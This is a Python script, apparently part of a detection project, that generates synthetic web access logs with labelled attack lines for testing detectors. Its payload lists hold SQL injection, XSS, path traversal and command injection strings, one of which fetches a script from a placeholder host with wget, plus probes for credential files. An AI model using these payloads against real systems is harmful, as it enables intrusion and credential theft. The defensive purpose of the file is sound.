"""Generate a synthetic Combined-format access log together with ground-truth attack labels.

Real logs hold real addresses and personal data, so the project ships synthetic ones. The
output is fully determined by the arguments: the same seed, size, ratio and start time give
byte-identical files. Every client address comes from the documentation ranges reserved for
examples (RFC 5737 and RFC 3849), never from a real network.

Usage:
    python scripts/generate_logs.py --seed 42 --lines 1000 --attack-ratio 0.1 \
        --start 2026-01-01T00:00:00Z --output out.log --labels out.labels.jsonl

The labels file is JSON Lines with one object per attack line, for example
``{"line": 17, "label": "sql_injection", "kind": "signature", "ip": "203.0.113.7"}``.
Lines are numbered from 1. Normal lines have no entry.
"""

import argparse
import json
import random
from datetime import datetime, timedelta, timezone
from pathlib import Path

DEFAULT_SEED = 42
DEFAULT_LINES = 1000
DEFAULT_ATTACK_RATIO = 0.1
DEFAULT_START = "2026-01-01T00:00:00Z"

SIGNATURE_LABELS = (
    "sql_injection",
    "xss",
    "path_traversal",
    "command_injection",
    "sensitive_file_probe",
)
BEHAVIOURAL_LABELS = ("brute_force", "scanner")
ATTACK_LABELS = SIGNATURE_LABELS + BEHAVIOURAL_LABELS

# A burst has at least this many lines, so detection rules can rely on the minimum.
BURST_MIN_LINES = {"brute_force": 20, "scanner": 40}
BURST_MAX_EXTRA = {"brute_force": 5, "scanner": 10}
BURST_WINDOW_SECONDS = {"brute_force": 120, "scanner": 60}
# At most this share of the attack lines goes to bursts.
BURST_SHARE = 0.75

_MONTHS = ("Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec")

# Documentation address ranges only. Normal visitors and attackers use separate pools, so a
# label always describes the address that sent the line.
_NORMAL_IPS = [f"192.0.2.{n}" for n in range(1, 121)] + [f"2001:db8::{n:x}" for n in range(1, 9)]
_ATTACKER_IPS = (
    [f"198.51.100.{n}" for n in range(1, 201)]
    + [f"203.0.113.{n}" for n in range(1, 201)]
    + [f"2001:db8:bad::{n:x}" for n in range(1, 9)]
)

_BROWSERS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 "
    "(KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 "
    "(KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
]
_BOTS = ["Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"]
_ATTACK_AGENTS = [
    "sqlmap/1.7.2#stable (https://sqlmap.org)",
    "Nikto/2.1.6",
    "curl/8.5.0",
    "python-requests/2.31.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "-",
]

_REFERERS = [
    "https://www.example.com/",
    "https://www.example.com/products",
    "https://www.example.com/about",
    "https://www.google.com/",
]

_STATIC_FILES = [
    "/static/app.css",
    "/static/app.js",
    "/static/logo.png",
    "/favicon.ico",
    "/robots.txt",
]

_SLUGS = ["spring-sale", "shipping-guide", "returns-policy", "new-arrivals", "gift-ideas"]

# Harmless requests that contain words a naive rule might flag.
_HARD_NEGATIVES = [
    "/search?q=select+shoes",
    "/search?q=drop+shipping+rates",
    "/search?q=union+jack+flag",
    "/download?file=report.pdf",
    "/download?file=annual-report-2025.pdf",
    "/blog/how-to-use-script-tags-in-email",
    "/docs/etc-hosts-explained",
    "/products?sort=price&order=desc",
    "/search?q=cat+food",
    "/help?topic=password-reset",
]

_SQL_PAYLOADS = [
    "/products?id=1'+OR+'1'='1",
    "/search?q=1+UNION+SELECT+username,password+FROM+users--",
    "/product.php?id=1;DROP+TABLE+users",
    "/login?user=admin'--",
    "/products?id=1%27+OR+1%3D1--",
    "/items?id=10+AND+SLEEP(5)",
]
_XSS_PAYLOADS = [
    "/search?q=<script>alert(1)</script>",
    "/search?q=%3Cscript%3Ealert(document.cookie)%3C/script%3E",
    "/comment?text=<img+src=x+onerror=alert(1)>",
    "/redirect?url=javascript:alert(1)",
    r"/profile?name=\"><svg/onload=alert(1)>",  # servers log a quote as \"
]
_TRAVERSAL_PAYLOADS = [
    "/download?file=../../../../etc/passwd",
    "/static/..%2f..%2f..%2fetc%2fshadow",
    "/files?name=..%5c..%5cwindows%5cwin.ini",
    "/view?page=....//....//....//etc/passwd",
    "/download?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
]
_COMMAND_PAYLOADS = [
    "/ping?host=127.0.0.1;cat+/etc/passwd",
    "/cgi-bin/run?cmd=ls+-la|id",
    "/api/exec?c=$(whoami)",
    "/tools?q=a&&wget+http://198.51.100.9/x.sh",
    "/ping?host=%60id%60",
]
_SENSITIVE_PAYLOADS = [
    "/.env",
    "/.git/config",
    "/wp-config.php.bak",
    "/backup.zip",
    "/.aws/credentials",
    "/phpinfo.php",
    "/id_rsa",
    "/config/database.yml",
]
_SIGNATURE_PAYLOADS = {
    "sql_injection": _SQL_PAYLOADS,
    "xss": _XSS_PAYLOADS,
    "path_traversal": _TRAVERSAL_PAYLOADS,
    "command_injection": _COMMAND_PAYLOADS,
    "sensitive_file_probe": _SENSITIVE_PAYLOADS,
}
_SIGNATURE_STATUSES = {
    "sql_injection": [200, 200, 400, 403, 500],
    "xss": [200, 200, 400, 403],
    "path_traversal": [400, 403, 404, 404],
    "command_injection": [400, 403, 404, 500],
    "sensitive_file_probe": [403, 404, 404, 404],
}

_SCANNER_PATHS = """
/admin /administrator /phpmyadmin /pma /wp-login.php /wp-admin /manager/html /cgi-bin/test.cgi
/cgi-bin/php /server-status /console /login.php /admin.php /backup /old /test /dev /staging
/api/v1/admin /solr /jenkins /actuator /actuator/env /debug /upload /uploads /shell /cmd
/webdav /owa /remote /vpn /portal /dashboard /panel /cpanel /webmail /mail /ftp /db /database
/sql /mysql /setup /install /config /conf /tmp /temp /logs /log /data /include /includes /lib
/vendor /node_modules /private /secret
""".split()


def _timestamp(moment: datetime) -> str:
    """Format a time as an access-log timestamp, without depending on the locale."""
    return (
        f"{moment.day:02d}/{_MONTHS[moment.month - 1]}/{moment.year}:"
        f"{moment.hour:02d}:{moment.minute:02d}:{moment.second:02d} +0000"
    )


def _format(record: dict) -> str:
    return (
        f"{record['ip']} - - [{_timestamp(record['time'])}] "
        f'"{record["method"]} {record["target"]} HTTP/1.1" {record["status"]} {record["size"]} '
        f'"{record["referer"]}" "{record["agent"]}"'
    )


def _skewed_choice(rng: random.Random, items: list[str]) -> str:
    """Pick an item so that a few visitors send most of the traffic."""
    return items[min(int(rng.expovariate(1 / 20)), len(items) - 1)]


_PAGE_KINDS = [
    "home",
    "products",
    "product",
    "static",
    "api_items",
    "api_user",
    "login_page",
    "login_post",
    "cart",
    "info",
    "blog",
]
_PAGE_WEIGHTS = [12, 6, 14, 22, 10, 5, 3, 4, 3, 5, 5]


def _normal_request(rng: random.Random) -> tuple[str, str, int, str]:
    """Pick a request for ordinary traffic as ``(method, target, status, content_kind)``."""
    roll = rng.random()
    if roll < 0.04:
        return "GET", rng.choice(_HARD_NEGATIVES), 200, "page"
    if roll < 0.055:
        missing = [f"/old/{rng.choice(_SLUGS)}", f"/images/missing-{rng.randint(1, 99)}.png"]
        return "GET", rng.choice(missing), 404, "page"
    if roll < 0.057:
        target = f"/api/items?page={rng.randint(1, 50)}"
        return "GET", target, rng.choice([500, 502, 503]), "api"

    kind = rng.choices(_PAGE_KINDS, weights=_PAGE_WEIGHTS)[0]
    if kind == "home":
        return rng.choice(["GET"] * 19 + ["HEAD"]), rng.choice(["/", "/home"]), 200, "page"
    if kind == "products":
        return "GET", "/products", 200, "page"
    if kind == "product":
        return "GET", f"/products/{rng.randint(1, 500)}", 200, "page"
    if kind == "static":
        target = rng.choice(_STATIC_FILES + [f"/static/img/{rng.randint(1, 60)}.jpg"])
        content = "text" if target.endswith((".css", ".js", ".txt")) else "image"
        return "GET", target, 304 if rng.random() < 0.15 else 200, content
    if kind == "api_items":
        target = f"/api/items?page={rng.randint(1, 50)}&limit={rng.choice([10, 20, 50])}"
        return "GET", target, 200, "api"
    if kind == "api_user":
        return "GET", f"/api/users/{rng.randint(1, 300)}", 200, "api"
    if kind == "login_page":
        return "GET", "/login", 200, "page"
    if kind == "login_post":
        status = 401 if rng.random() < 0.015 else rng.choice([302, 302, 302, 200])
        return "POST", "/login", status, "page"
    if kind == "cart":
        return rng.choice(["GET", "POST"]), "/api/cart", 200, "api"
    if kind == "info":
        return "GET", rng.choice(["/about", "/contact"]), 200, "page"
    return "GET", f"/blog/{rng.choice(_SLUGS)}", 200, "page"


def _response_size(rng: random.Random, status: int, kind: str) -> int | str:
    if status == 304:
        return "-"
    if status in (302, 404) or status >= 500:
        return rng.randint(0, 600)
    sizes = {"image": (8000, 400000), "text": (5000, 150000), "api": (200, 5000)}
    return rng.randint(*sizes.get(kind, (2000, 60000)))


def _normal_record(rng: random.Random, when: datetime) -> dict:
    """One line of ordinary traffic, including a few harmless-but-odd requests."""
    method, target, status, kind = _normal_request(rng)
    agent = rng.choice(_BOTS) if rng.random() < 0.04 else rng.choice(_BROWSERS)
    return {
        "ip": _skewed_choice(rng, _NORMAL_IPS),
        "time": when,
        "method": method,
        "target": target,
        "status": status,
        "size": _response_size(rng, status, kind),
        "referer": "-" if rng.random() < 0.4 else rng.choice(_REFERERS),
        "agent": agent,
    }


def _plan_attacks(rng: random.Random, attack_lines: int) -> list[tuple[str, int]]:
    """Decide which attacks to send as ``(label, line_count)`` so the total is exact.

    Classes are taken in turn so a larger log contains every one of them. Bursts are long, so
    they may use only part of the budget, which keeps the signature attacks well represented.
    A burst is planned only when enough lines remain for it to be a real burst.
    """
    plan: list[tuple[str, int]] = []
    remaining = attack_lines
    burst_room = int(attack_lines * BURST_SHARE)
    active = list(ATTACK_LABELS)
    while remaining > 0 and active:
        for label in list(active):
            if remaining <= 0:
                break
            if label in BURST_MIN_LINES:
                room = min(remaining, burst_room)
                if room < BURST_MIN_LINES[label]:
                    active.remove(label)
                    continue
                size = BURST_MIN_LINES[label] + rng.randint(0, BURST_MAX_EXTRA[label])
                size = min(size, room)
                burst_room -= size
            else:
                size = 1
            plan.append((label, size))
            remaining -= size
    return plan


def _attack_records(
    rng: random.Random, label: str, size: int, ip: str, when: datetime
) -> list[dict]:
    agent = rng.choice(_ATTACK_AGENTS)
    base = {"ip": ip, "referer": "-", "agent": agent}
    if label in _SIGNATURE_PAYLOADS:
        status = rng.choice(_SIGNATURE_STATUSES[label])
        return [
            {
                **base,
                "time": when,
                "method": "GET",
                "status": status,
                "target": rng.choice(_SIGNATURE_PAYLOADS[label]),
                "size": rng.randint(0, 5000),
            }
        ]

    window = BURST_WINDOW_SECONDS[label]
    offsets = sorted(rng.randint(0, window - 1) for _ in range(size))
    if label == "brute_force":
        return [
            {
                **base,
                "time": when + timedelta(seconds=offset),
                "method": "POST",
                "target": "/login",
                "status": 401,
                "size": rng.randint(300, 900),
            }
            for offset in offsets
        ]
    paths = rng.sample(_SCANNER_PATHS, size)
    return [
        {
            **base,
            "time": when + timedelta(seconds=offset),
            "method": "GET",
            "target": path,
            "status": 404,
            "size": rng.randint(150, 600),
        }
        for offset, path in zip(offsets, paths, strict=True)
    ]


def generate(
    seed: int = DEFAULT_SEED,
    lines: int = DEFAULT_LINES,
    attack_ratio: float = DEFAULT_ATTACK_RATIO,
    start: datetime | None = None,
) -> tuple[list[str], list[dict]]:
    """Build the log lines and the labels for the attack lines.

    Returns ``(log_lines, labels)``. ``labels`` holds one dict per attack line with the
    keys ``line`` (1-based), ``label``, ``kind`` and ``ip``, in line order.
    """
    if lines < 0:
        raise ValueError("lines must not be negative")
    if not 0.0 <= attack_ratio <= 1.0:
        raise ValueError("attack_ratio must be between 0 and 1")
    rng = random.Random(seed)
    start = start or datetime.fromisoformat(DEFAULT_START.replace("Z", "+00:00"))
    if start.tzinfo is None:
        start = start.replace(tzinfo=timezone.utc)
    start = start.astimezone(timezone.utc)

    plan = _plan_attacks(rng, round(lines * attack_ratio))
    attack_total = sum(size for _, size in plan)

    # Each record keeps its label so the labels can be numbered after the final ordering.
    records: list[tuple[dict, str | None]] = []
    clock, span = start, 0
    for _ in range(lines - attack_total):
        clock += timedelta(seconds=rng.randint(0, 3))
        span = int((clock - start).total_seconds())
        records.append((_normal_record(rng, clock), None))

    attackers = rng.sample(_ATTACKER_IPS, len(_ATTACKER_IPS))
    for number, (label, size) in enumerate(plan):
        ip = attackers[number % len(attackers)]
        moment = start + timedelta(seconds=rng.randint(0, max(span, 1)))
        records.extend((record, label) for record in _attack_records(rng, label, size, ip, moment))

    records.sort(key=lambda item: item[0]["time"])  # stable, so ties keep their order

    log_lines = [_format(record) for record, _ in records]
    labels = [
        {
            "line": number,
            "label": label,
            "kind": "behavioural" if label in BEHAVIOURAL_LABELS else "signature",
            "ip": record["ip"],
        }
        for number, (record, label) in enumerate(records, start=1)
        if label is not None
    ]
    return log_lines, labels


def _parse_start(text: str) -> datetime:
    try:
        return datetime.fromisoformat(text.replace("Z", "+00:00"))
    except ValueError:
        raise argparse.ArgumentTypeError(f"not an ISO 8601 date-time: {text!r}") from None


def _ratio(text: str) -> float:
    try:
        value = float(text)
    except ValueError:
        raise argparse.ArgumentTypeError(f"not a number: {text!r}") from None
    if not 0.0 <= value <= 1.0:
        raise argparse.ArgumentTypeError("must be between 0 and 1")
    return value


def _count(text: str) -> int:
    try:
        value = int(text)
    except ValueError:
        raise argparse.ArgumentTypeError(f"not an integer: {text!r}") from None
    if value < 0:
        raise argparse.ArgumentTypeError("must not be negative")
    return value


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(description=__doc__.split("\n\n")[0])
    parser.add_argument("--seed", type=int, default=DEFAULT_SEED)
    parser.add_argument("--lines", type=_count, default=DEFAULT_LINES)
    parser.add_argument("--attack-ratio", type=_ratio, default=DEFAULT_ATTACK_RATIO)
    parser.add_argument("--start", type=_parse_start, default=_parse_start(DEFAULT_START))
    parser.add_argument("--output", type=Path, required=True, help="log file to write")
    parser.add_argument("--labels", type=Path, help="JSON Lines file for the attack labels")
    args = parser.parse_args(argv)

    log_lines, labels = generate(args.seed, args.lines, args.attack_ratio, args.start)

    args.output.write_text("".join(f"{x}\n" for x in log_lines), encoding="utf-8", newline="\n")
    if args.labels is not None:
        text = "".join(json.dumps(item) + "\n" for item in labels)
        args.labels.write_text(text, encoding="utf-8", newline="\n")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
